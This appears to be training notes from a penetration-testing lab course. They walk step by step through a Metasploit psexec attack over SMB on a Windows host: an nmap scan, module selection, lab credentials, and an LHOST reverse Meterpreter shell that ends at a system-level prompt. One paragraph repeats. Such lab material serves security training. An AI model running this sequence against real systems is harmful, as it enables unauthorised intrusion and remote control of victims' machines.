[Metasploit](https://www.metasploit.com/) is an automated attack framework developed by `Rapid7` that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and deliver payloads to gain a shell on a vulnerable system.

## Practicing with Metasploit

We could spend the rest of this module covering everything about Metasploit, but we are only going to go so far as to work with the very basics within the context of shells & payloads.

Let's start working hands-on with Metasploit by launching the Metasploit framework console as root (`sudo msfconsole`)

 Let's get familiar with Metasploit payloads by using a classic `exploit module` that can be used to compromise a Windows system. Remember that Metasploit can be used for more than just exploitation. We can also use different modules to scan & enumerate targets.

In this case, we will be using enumeration results from a `nmap` scan to pick a Metasploit module to use.

#### NMAP Scan

	AstraX01@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

In the output, we see several standard ports that are typically open on a Windows system by default. Remember that scanning and enumeration is an excellent way to know what OS (Windows or Linux) our target is running to find an appropriate module to run with Metasploit. Let's go with `SMB` (listening on `445`) as the potential attack vector.

In the output, we see several standard ports that are typically open on a Windows system by default. Remember that scanning and enumeration is an excellent way to know what OS (Windows or Linux) our target is running to find an appropriate module to run with Metasploit. Let's go with `SMB` (listening on `445`) as the potential attack vector.

Once we have this information, we can use Metasploit's search functionality to discover modules that are associated with SMB. In the `msfconsole`, we can issue the command `search smb` to get a list of modules associated with SMB vulnerabilities:

#### Searching Within Metasploit

	msf6 > search smb

#### Option Selection

	msf6 > use 56
	
	[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp 
	msf6 exploit(windows/smb/psexec) >

Notice how `exploit` is outside of the parentheses. This can be interpreted as the MSF module type being an exploit, and the specific exploit & payload is written for Windows. The attack vector is `SMB`, and the Meterpreter payload will be delivered using [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Let's learn more about using this exploit and delivering the payload by using the `options` command.

#### Examining an Exploit's Options

	msf6 exploit(windows/smb/psexec) > options

This is one area where Metasploit shines in terms of ease of use. In the output of the module options, we see various options and settings with a description of what each setting means. We will not be using `SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME` and `SERVICE_NAME` in this section. Notice how this particular exploit will use a reverse TCP shell connection utilizing `Meterpreter`. A Meterpreter shell gives us far more functionality than a raw TCP reverse shell, as we established in this module's earlier sections. It is the default payload that is used in Metasploit.

We will want to use the `set` command to configure the following settings as such:

#### Setting Options

	msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71 
	RHOSTS => 10.129.180.71 
	msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$ 
	SHARE => ADMIN$ 
	msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt! 
	SMBPass => HTB_@cademy_stdnt! 
	msf6 exploit(windows/smb/psexec) > set SMBUser htb-student 
	SMBUser => htb-student 
	msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222 
	LHOST => 10.10.14.222

These settings will ensure that our payload is delivered to the proper target (`RHOSTS`), uploaded to the default administrative share (`ADMIN$`) utilizing credentials (`SMBPass` & `SMBUser`), then initiate a reverse shell connection with our local host machine (`LHOST`).
#### Exploits Away

	msf6 exploit(windows/smb/psexec) > exploit

After we issue the `exploit` command, the exploit is run, and there is an attempt to deliver the payload onto the target utilizing the Meterpreter payload. Metasploit reports back each step of this process, as seen in the output. We know this was successful because a `stage` was sent successfully, which established a Meterpreter shell session (`meterpreter >`) and a system-level shell session. Keep in mind that Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish a communication channel between an attack box and a target. The proper credentials and attack vector can give us the ability to upload & download files, execute system commands, run a keylogger, create/start/stop services, manage processes, and more.
Like other command language interpreters (Bash, PowerShell, ksh, etc...), Meterpreter shell sessions allow us to issue a set of commands we can use to interact with the target system. We can use the `?` to see a list of commands we can use. We will notice limitations with the Meterpreter shell, so it is good to attempt to use the `shell` command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.

#### Interactive Shell

	meterpreter > shell 
	Process 604 created.
	Channel 1 created. 
	Microsoft Windows [Version 10.0.18362.1256] 
	(c) 2019 Microsoft Corporation. All rights reserved. 
	
	C:\WINDOWS\system32>


